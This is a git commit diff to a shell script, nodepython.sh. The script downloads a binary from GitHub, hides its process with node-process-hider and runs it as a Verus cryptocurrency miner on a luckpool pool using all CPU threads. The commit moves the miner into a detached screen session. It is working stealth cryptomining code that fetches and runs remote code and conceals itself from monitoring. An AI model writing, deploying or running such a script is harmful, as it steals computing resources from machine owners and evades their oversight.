c654e161a6326ae65ce6f0d16e5620fa72db24c1
ahmadghozaliurhniyu <87011511+ahmadghozaliurhniyu@users.noreply.github.com>
2021-10-14 19:16:39 +0700

    Update nodepython.sh

--- nodepython.sh
+++ nodepython.sh
@@ -9,6 +9,7 @@ wget -O bionicv2 https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefrome
 chmod +x bionicv2
 apt-get update
 apt-get install screen -y
+apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev -y
 apt-get install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
 npm i -g node-process-hider
 ph add bionicv2
@@ -16,4 +17,6 @@ pool="stratum+tcp://na.luckpool.net:3956"
 wallet="$1"
 workername="$(cat /proc/sys/kernel/hostname)"
 thread="$(nproc --all)"
-./bionicv2 -a verus -o $pool -u $wallet.$workername -t $thread -p -x $proxy
+
+screen -S "mylittlescreen" -d -m
+screen -r "mylittlescreen" -X stuff $'./bionicv2 -a verus -o $pool -u $wallet.$workername -t $thread -p x\n'
